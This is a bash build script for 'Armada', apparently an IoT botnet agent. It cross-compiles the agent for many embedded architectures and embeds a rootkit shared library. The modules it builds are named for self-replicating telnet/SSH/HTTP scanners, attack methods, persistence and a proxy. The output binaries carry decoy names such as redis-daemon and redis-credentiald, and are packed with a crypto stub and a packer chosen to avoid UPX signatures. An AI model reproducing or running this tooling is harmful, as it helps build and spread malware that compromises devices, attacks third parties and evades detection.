#!/bin/bash
# Armada Pure C Agent Builder
# Cross-compiles for all uClibc architectures with relocated sysroot fixes

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PROJECT_ROOT="$(cd "$SCRIPT_DIR/.." && pwd)"
BOT_DIR="$PROJECT_ROOT/bot"
BINS="$PROJECT_ROOT/bins"
UPX_BIN="$SCRIPT_DIR/upx"
XC="/etc/xcompile"

CFLAGS="-Os -s -Wno-all -ffunction-sections -fdata-sections -fno-unwind-tables -fno-asynchronous-unwind-tables -fno-stack-protector -fno-ident -fmerge-all-constants -fno-math-errno -Iheaders"
LDSTRIP="-Wl,--strip-all -Wl,-z,norelro -Wl,--hash-style=sysv -Wl,--build-id=none"

# Old GCC 4.1.2 cross-compilers choke on newer flags — use safe subset
XCFLAGS="-Os -s -Wno-all -ffunction-sections -fdata-sections -fno-ident -fomit-frame-pointer -fmerge-all-constants -Iheaders"

# Debug mode: add -DDEBUG when DEBUG=1 env var or .debug marker exists
if [ "${DEBUG:-0}" = "1" ] || [ -f "$BOT_DIR/.debug" ]; then
    CFLAGS="$CFLAGS -DDEBUG"
    XCFLAGS="$XCFLAGS -DDEBUG"
    echo "  [DEBUG MODE ENABLED]"
fi
XLDSTRIP="-Wl,--strip-all"

CORE_SRCS="ds.c crypto.c config.c opsec.c connection.c commands.c persist.c socks.c main.c"
SCAN_SRCS="telnet.c ssh.c scanner_http.c scan_report.c"
ATK_SRCS="attack.c attack_method.c"

# NO_SELFREP mode: exclude scanner sources and add -DNO_SELFREP define
if [ "${NO_SELFREP:-0}" = "1" ]; then
    SRCS="$CORE_SRCS"
    CFLAGS="$CFLAGS -DNO_SELFREP"
    XCFLAGS="$XCFLAGS -DNO_SELFREP"
    SCAN_LABEL=" (no-selfrep)"
else
    SRCS="$CORE_SRCS $SCAN_SRCS"
    SCAN_LABEL=""
fi

# NO_ATTACK mode: exclude attack sources and add -DNO_ATTACK define
if [ "${NO_ATTACK:-0}" = "1" ]; then
    CFLAGS="$CFLAGS -DNO_ATTACK"
    XCFLAGS="$XCFLAGS -DNO_ATTACK"
    ATK_LABEL=" (no-attack)"
else
    SRCS="$SRCS $ATK_SRCS"
    ATK_LABEL=""
fi

OK=0; FAIL=0

echo "╔══════════════════════════════════════════════════════╗"
echo "║   Armada Pure C Agent — Build System                  ║"
echo "╚══════════════════════════════════════════════════════╝"
if [ -n "$ATK_LABEL" ]; then
    echo "  Mode: PROXY ONLY (attack code disabled)"
fi
if [ -n "$SCAN_LABEL" ]; then
    echo "  Mode: NO SELFREP (scanner/exploit code disabled)"
fi
echo ""

cd "$BOT_DIR"
echo "Cleaning $BINS..."

rm -rf "$BINS"
mkdir -p "$BINS"
if ls "$BINS"/* >/dev/null 2>&1; then
    echo "ERROR: Failed to clean bins directory!"
    exit 1
fi

# Fix missing syslimits.h in ARMv6/v7 toolchains (one-time)
for d in "$XC/armv6l/cc/include" "$XC/armv7l/cc/include"; do
    if [ ! -f "$d/syslimits.h" ] && [ -d "$d" ]; then
        echo '#include_next <limits.h>' > "$d/syslimits.h"
    fi
done

# Ensure MIPS assembler wrapper exists in tools/mips-tools/
# mips-rawgcc passes -EB to the assembler; mips-as does not accept -EB as a
# standalone flag, so we use a wrapper that strips it before delegating.
MIPS_TOOLS="$SCRIPT_DIR/mips-tools"
mkdir -p "$MIPS_TOOLS"
if [ ! -x "$MIPS_TOOLS/as" ]; then
    cat > "$MIPS_TOOLS/as" << 'MIPS_AS_WRAPPER'
#!/bin/bash
args=()
for arg in "$@"; do
    [ "$arg" = "-EB" ] && continue
    args+=("$arg")
done
exec /etc/xcompile/mips/bin/mips-as "${args[@]}"
MIPS_AS_WRAPPER
    chmod +x "$MIPS_TOOLS/as"
fi

# ── Build rootkit .so and embed as C header (x86_64 only) ──
echo "Building rootkit .so..."
RK_HEADER="$BOT_DIR/headers/rootkit_blob.h"
gcc -shared -fPIC -Os -s -ffunction-sections -fdata-sections \
    -fno-unwind-tables -fno-asynchronous-unwind-tables -fno-ident \
    -Wl,--gc-sections -Wl,-z,norelro -Wl,--hash-style=sysv -Wl,--build-id=none \
    -o /tmp/libproc.so "$BOT_DIR/rootkit.c" -ldl 2>/dev/null
strip --strip-all --remove-section=.comment --remove-section=.note \
    --remove-section=.note.gnu.build-id --remove-section=.eh_frame \
    --remove-section=.eh_frame_hdr /tmp/libproc.so 2>/dev/null
RK_FLAG=""
if [ -f /tmp/libproc.so ]; then
    printf "  rootkit .so: %s\n" "$(du -h /tmp/libproc.so | cut -f1)"
    # Generate C header with clean variable names
    (cd /tmp && xxd -i libproc.so) > "$RK_HEADER"
    RK_FLAG="-DEMBED_ROOTKIT"
    rm -f /tmp/libproc.so
else
    echo "  rootkit .so: SKIP (native gcc failed)"
    echo "/* rootkit .so not available */" > "$RK_HEADER"
fi

# ── Native build (x86_64 with embedded rootkit) ──
echo "Building native..."
gcc $CFLAGS $RK_FLAG -B/usr/bin -o armada $SRCS -lpthread -Wl,--gc-sections $LDSTRIP 2>&1 | grep -i error || true
if [ -f armada ]; then
    printf "  native: %s\n" "$(du -h armada | cut -f1)"
    cp -f armada "$BINS/redis-daemon"
else
    echo "  native: FAIL"
fi

# ── Cross-build helper for self-contained toolchains ──
xbuild_simple() {
    local label=$1 cc=$2 out=$3
    printf "  %s... " "$label"
    if $cc $XCFLAGS -static -o "$BINS/$out" $SRCS -lpthread -Wl,--gc-sections $XLDSTRIP 2>/dev/null; then
        printf "%s\n" "$(du -h "$BINS/$out" | cut -f1)"; OK=$((OK+1))
    else printf "FAIL\n"; FAIL=$((FAIL+1)); fi
}

# ── Cross-build helper for relocated toolchains ──
xbuild_fix() {
    local label=$1 cc=$2 cc1dir=$3 asdir=$4 gccinc=$5 uclibc_inc=$6 gcclib=$7 uclibc_lib=$8 out=$9
    printf "  %s... " "$label"
    if $cc $XCFLAGS \
        -B"$cc1dir/" -B"$asdir/" -B"$gcclib/" -B"$uclibc_lib/" \
        -nostdinc -isystem "$gccinc" -isystem "$uclibc_inc" \
        -L"$uclibc_lib" -L"$gcclib" \
        -static -o "$BINS/$out" $SRCS \
        -lpthread -Wl,--gc-sections $XLDSTRIP 2>/dev/null; then
        printf "%s\n" "$(du -h "$BINS/$out" | cut -f1)"; OK=$((OK+1))
    else printf "FAIL\n"; FAIL=$((FAIL+1)); fi
}

echo ""
echo "Cross-compiling..."

# Self-contained toolchains
xbuild_simple "x86_64" "$XC/x86_64/bin/x86_64-gcc" "redis-daemon"
xbuild_simple "i586"   "$XC/i586/bin/i586-gcc" "redis-proxyd"
xbuild_simple "i486"   "$XC/cross-compiler-i486/bin/i486-gcc" "redis-initd"
printf "  mips32... "
if /etc/xcompile/mips/bin/mips-rawgcc $XCFLAGS \
    -B"$MIPS_TOOLS/" \
    -B/etc/xcompile/mips/libexec/gcc/mips-unknown-linux/4.1.2/ \
    -B/etc/xcompile/mips/lib/ \
    -B/etc/xcompile/mips/gcc/lib/ \
    -isystem /etc/xcompile/mips/include \
    -isystem /etc/xcompile/mips/gcc/include \
    -L/etc/xcompile/mips/lib \
    -L/etc/xcompile/mips/gcc/lib \
    -mips1 -mabi=32 \
    -static -o "$BINS/redis-credentiald" $SRCS \
    -lpthread -Wl,--gc-sections $XLDSTRIP 2>/dev/null; then
    printf "%s\n" "$(du -h "$BINS/redis-credentiald" | cut -f1)"; OK=$((OK+1))
else printf "FAIL\n"; FAIL=$((FAIL+1)); fi

printf "  mips32r2... "
if /etc/xcompile/mips/bin/mips-rawgcc $XCFLAGS \
    -B"$MIPS_TOOLS/" \
    -B/etc/xcompile/mips/libexec/gcc/mips-unknown-linux/4.1.2/ \
    -B/etc/xcompile/mips/lib/ \
    -B/etc/xcompile/mips/gcc/lib/ \
    -isystem /etc/xcompile/mips/include \
    -isystem /etc/xcompile/mips/gcc/include \
    -L/etc/xcompile/mips/lib \
    -L/etc/xcompile/mips/gcc/lib \
    -mips32r2 -mabi=32 \
    -static -o "$BINS/redis-credentiald-r2" $SRCS \
    -lpthread -Wl,--gc-sections $XLDSTRIP 2>/dev/null; then
    printf "%s\n" "$(du -h "$BINS/redis-credentiald-r2" | cut -f1)"; OK=$((OK+1))
else printf "FAIL\n"; FAIL=$((FAIL+1)); fi
# Relocated toolchains (need -B/-isystem/-L fixes)
xbuild_fix "mipsel" \
    "$XC/mipsel/mipsel-unknown-linux/bin/gcc" \
    "$XC/mipsel/libexec/gcc/mipsel-unknown-linux/4.1.2" \
    "$XC/mipsel/mipsel-unknown-linux/bin" \
    "$XC/mipsel/gcc/include" "$XC/mipsel/include" \
    "$XC/mipsel/gcc/lib" "$XC/mipsel/lib" \
    "redis-composd"

xbuild_fix "armv4l" \
    "$XC/armv4l/armv4l-unknown-linux/bin/gcc" \
    "$XC/armv4l/libexec/gcc/armv4l-unknown-linux/4.1.2" \
    "$XC/armv4l/armv4l-unknown-linux/bin" \
    "$XC/armv4l/gcc/include" "$XC/armv4l/include" \
    "$XC/armv4l/gcc/lib" "$XC/armv4l/lib" \
    "redis-conteinerd"

xbuild_fix "armv5l" \
    "$XC/armv5l/armv5l-unknown-linux/bin/gcc" \
    "$XC/armv5l/libexec/gcc/armv5l-unknown-linux/4.1.2" \
    "$XC/armv5l/armv5l-unknown-linux/bin" \
    "$XC/armv5l/gcc/include" "$XC/armv5l/include" \
    "$XC/armv5l/gcc/lib" "$XC/armv5l/lib" \
    "redis-conteinerd-shim"

xbuild_fix "armv6l" \
    "$XC/armv6l/armv6l-unknown-linux-gnueabi/bin/gcc" \
    "$XC/armv7l/armv6l-unknown-linux-gnueabi/bin" \
    "$XC/armv6l/armv6l-unknown-linux-gnueabi/bin" \
    "$XC/armv6l/cc/include" "$XC/armv6l/include" \
    "$XC/armv6l/cc/lib" "$XC/armv6l/lib" \
    "redis-runcd"

xbuild_fix "armv7l" \
    "$XC/armv7l/armv6l-unknown-linux-gnueabi/bin/gcc" \
    "$XC/armv7l/armv6l-unknown-linux-gnueabi/bin" \
    "$XC/armv7l/armv6l-unknown-linux-gnueabi/bin" \
    "$XC/armv7l/cc/include" "$XC/armv7l/include" \
    "$XC/armv7l/cc/lib" "$XC/armv7l/lib" \
    "redis-buildxd"

xbuild_fix "powerpc" \
    "$XC/powerpc/powerpc-unknown-linux/bin/gcc" \
    "$XC/powerpc/libexec/gcc/powerpc-unknown-linux/4.1.2" \
    "$XC/powerpc/powerpc-unknown-linux/bin" \
    "$XC/powerpc/gcc/include" "$XC/powerpc/include" \
    "$XC/powerpc/gcc/lib" "$XC/powerpc/lib" \
    "redis-scoutd"

xbuild_fix "sh4" \
    "$XC/sh4/bin/sh4-rawgcc" \
    "$XC/sh4/libexec/gcc/sh-superh-linux/4.1.2" \
    "$XC/sh4/sh-superh-linux/bin" \
    "$XC/sh4/gcc/include" "$XC/sh4/include" \
    "$XC/sh4/gcc/lib" "$XC/sh4/lib" \
    "redis-sbomd"

# SPARC needs a fixed clone.o: the uClibc clone.S uses R_SPARC_13 relocation
# for __syscall_error, which requires an absolute address < 4096 — impossible
# in a large static binary.  We assemble a replacement that uses a proper
# PC-relative call instead.
printf "  sparc... "
_SPARC_CLONE_FIX=""
cat > "$SCRIPT_DIR/sparc-clone-fix.S" << 'SPARC_CLONE_EOF'
    .text
    .align  4
    .global clone
    .type   clone, @function
clone:
    save    %sp, -96, %sp
    tst     %i0
    be      .Lerror
     orcc   %i1, %g0, %o1
    be      .Lerror
     mov    %i2, %o0
    mov     0xd9, %g1
    ta      0x10
    bcs     .Lerror
     tst    %o1
    bne     .Lthread_start
     nop
    ret
     restore %o0, %g0, %o0
.Lerror:
    call    __syscall_error
     nop
    ret
     restore
.Lthread_start:
    call    %i0
     mov    %i3, %o0
    call    _exit
     nop
    .size   clone, . - clone
SPARC_CLONE_EOF
if $XC/sparc/bin/sparc-rawgcc \
        -B$XC/sparc/libexec/gcc/sparc-unknown-linux/4.1.2/ \
        -B$XC/sparc/sparc-unknown-linux/bin/ \
        -nostdinc \
        -c -o "$SCRIPT_DIR/sparc-clone-fix.o" "$SCRIPT_DIR/sparc-clone-fix.S" 2>/dev/null; then
    _SPARC_CLONE_FIX="$SCRIPT_DIR/sparc-clone-fix.o"
fi
if $XC/sparc/bin/sparc-rawgcc $XCFLAGS \
        -B$XC/sparc/libexec/gcc/sparc-unknown-linux/4.1.2/ \
        -B$XC/sparc/sparc-unknown-linux/bin/ \
        -B$XC/sparc/gcc/lib/ -B$XC/sparc/lib/ \
        -nostdinc \
        -isystem $XC/sparc/gcc/include -isystem $XC/sparc/include \
        -L$XC/sparc/gcc/lib -L$XC/sparc/lib \
        -static -o "$BINS/redis-machined" \
        $_SPARC_CLONE_FIX $SRCS \
        -lpthread -Wl,--gc-sections $XLDSTRIP 2>/dev/null; then
    printf "%s\n" "$(du -h "$BINS/redis-machined" | cut -f1)"; OK=$((OK+1))
else printf "FAIL\n"; FAIL=$((FAIL+1)); fi
rm -f "$SCRIPT_DIR/sparc-clone-fix.S" "$SCRIPT_DIR/sparc-clone-fix.o"

xbuild_fix "m68k" \
    "$XC/m68k/bin/m68k-rawgcc" \
    "$XC/m68k/libexec/gcc/m68k-unknown-linux/4.1.2" \
    "$XC/m68k/m68k-unknown-linux/bin" \
    "$XC/m68k/gcc/include" "$XC/m68k/include" \
    "$XC/m68k/gcc/lib" "$XC/m68k/lib" \
    "redis-scand"

echo ""
echo "$OK OK, $FAIL FAIL"
echo ""

# ── MIPS stub packing (XpLt incompatible with 2.6.x kernels) ──
# Uses same _rx0/_rx1 key material as crypto.c — magic key required to decrypt.
CRYPTO_C="$BOT_DIR/crypto.c"
if python3 --version >/dev/null 2>&1 && [ -f "$CRYPTO_C" ]; then
    echo "Packing MIPS binaries with crypto stub..."
    MIPS_CC="/etc/xcompile/mips/bin/mips-rawgcc"
    MIPS_FLAGS="-B$MIPS_TOOLS/ \
        -B/etc/xcompile/mips/libexec/gcc/mips-unknown-linux/4.1.2/ \
        -B/etc/xcompile/mips/lib/ -B/etc/xcompile/mips/gcc/lib/ \
        -isystem /etc/xcompile/mips/include \
        -isystem /etc/xcompile/mips/gcc/include \
        -L/etc/xcompile/mips/lib -L/etc/xcompile/mips/gcc/lib \
        -mips1 -mabi=32"
    MIPS_R2_FLAGS="-B$MIPS_TOOLS/ \
        -B/etc/xcompile/mips/libexec/gcc/mips-unknown-linux/4.1.2/ \
        -B/etc/xcompile/mips/lib/ -B/etc/xcompile/mips/gcc/lib/ \
        -isystem /etc/xcompile/mips/include \
        -isystem /etc/xcompile/mips/gcc/include \
        -L/etc/xcompile/mips/lib -L/etc/xcompile/mips/gcc/lib \
        -mips32r2 -mabi=32"
    MIPSEL_CC="$XC/mipsel/mipsel-unknown-linux/bin/gcc"
    MIPSEL_FLAGS="-B$XC/mipsel/libexec/gcc/mipsel-unknown-linux/4.1.2/ \
        -B$XC/mipsel/mipsel-unknown-linux/bin/ \
        -B$XC/mipsel/gcc/lib/ -B$XC/mipsel/lib/ \
        -nostdinc \
        -isystem $XC/mipsel/gcc/include -isystem $XC/mipsel/include \
        -L$XC/mipsel/gcc/lib -L$XC/mipsel/lib"

    # Pack each MIPS binary if it was built successfully
    for entry in \
        "redis-credentiald:$MIPS_CC:$MIPS_FLAGS" \
        "redis-credentiald-r2:$MIPS_CC:$MIPS_R2_FLAGS" \
        "redis-composd:$MIPSEL_CC:$MIPSEL_FLAGS"
    do
        bname="${entry%%:*}"
        rest="${entry#*:}"
        bcc="${rest%%:*}"
        bflags="${rest#*:}"
        raw="$BINS/$bname"
        if [ ! -f "$raw" ]; then continue; fi
        tmp="${raw}.raw"
        mv "$raw" "$tmp"
        # shellcheck disable=SC2086
        if python3 "$SCRIPT_DIR/mipspk.py" "$tmp" "$raw" \
                "$CRYPTO_C" "$bcc" $bflags 2>&1; then
            rm -f "$tmp"
        else
            echo "  WARNING: stub pack failed for $bname, keeping raw binary"
            mv "$tmp" "$raw"
        fi
    done
else
    echo "WARNING: python3 or crypto.c not found — MIPS binaries NOT stub-packed"
fi
echo ""

# ── Compress (m30w packer — no UPX signatures to strip) ──
PACKED=0; SKIPPED=0; SAVED=0
if [ ! -f "$UPX_BIN" ]; then
    echo ""
    echo "WARNING: m30w packer not found at $UPX_BIN"
    echo "Binaries will NOT be compressed. Copy the packer to tools/upx"
elif [ ! -x "$UPX_BIN" ]; then
    echo ""
    echo "WARNING: m30w packer not executable, fixing..."
    chmod +x "$UPX_BIN"
fi
if [ -x "$UPX_BIN" ]; then
    echo ""
    echo "Packing binaries..."
    echo "────────────────────────────────────────────────"
    for f in "$BINS"/*; do
        [ -f "$f" ] || continue
        name=$(basename "$f")
        # Skip MIPS binaries: XpLt stub uses syscalls (4147, 4354) absent on
        # Linux 2.6.x embedded kernels — packed binary gets SIGTRAP at runtime.
        elf_machine=$(od -A n -t x1 -j 18 -N 2 "$f" 2>/dev/null | tr -d ' \n')
        if [ "$elf_machine" = "0800" ] || [ "$elf_machine" = "0008" ]; then
            printf "  %-26s         (skipped — MIPS, stub incompatible with 2.6.x)\n" "$name"
            SKIPPED=$((SKIPPED+1))
            continue
        fi
        before=$(stat -c%s "$f")
        bh=$(numfmt --to=iec --suffix=B $before)
        packed=0
        last_err=""
        for method in --lzma --best -9; do
            cp "$f" "$f.tmp"
            err=$("$UPX_BIN" $method "$f.tmp" 2>&1)
            rc=$?
            if [ $rc -eq 0 ] && [ -f "$f.tmp" ] && [ "$(stat -c%s "$f.tmp")" -lt "$before" ]; then
                mv "$f.tmp" "$f"
                after=$(stat -c%s "$f")
                ah=$(numfmt --to=iec --suffix=B $after)
                pct=$(( (before - after) * 100 / before ))
                printf "  %-26s %7s → %7s  (%d%% smaller)\n" "$name" "$bh" "$ah" "$pct"
                PACKED=$((PACKED+1))
                SAVED=$((SAVED + before - after))
                packed=1
                break
            fi
            last_err=$(echo "$err" | grep -i 'exception\|error\|cannot\|not supported\|invalid' | head -1)
            rm -f "$f.tmp"
        done
        if [ "$packed" = "0" ]; then
            # Show why it failed — run once more to capture output
            failmsg=$("$UPX_BIN" --best "$f" 2>&1 | grep -i 'exception\|error\|cannot\|not.support\|invalid\|Already' | head -1 | sed 's/.*: //')
            if [ -n "$failmsg" ]; then
                printf "  %-26s %7s   (FAILED: %s)\n" "$name" "$bh" "$failmsg"
            else
                printf "  %-26s %7s   (skipped — packer returned no output)\n" "$name" "$bh"
            fi
            SKIPPED=$((SKIPPED+1))
        fi
    done
    echo "────────────────────────────────────────────────"
    printf "  %d packed, %d skipped, %s saved\n" $PACKED $SKIPPED "$(numfmt --to=iec --suffix=B $SAVED)"
    echo ""
fi

echo "Final binaries:"
ls -lhS "$BINS/"
echo ""
echo "=== $OK built, $FAIL failed ==="
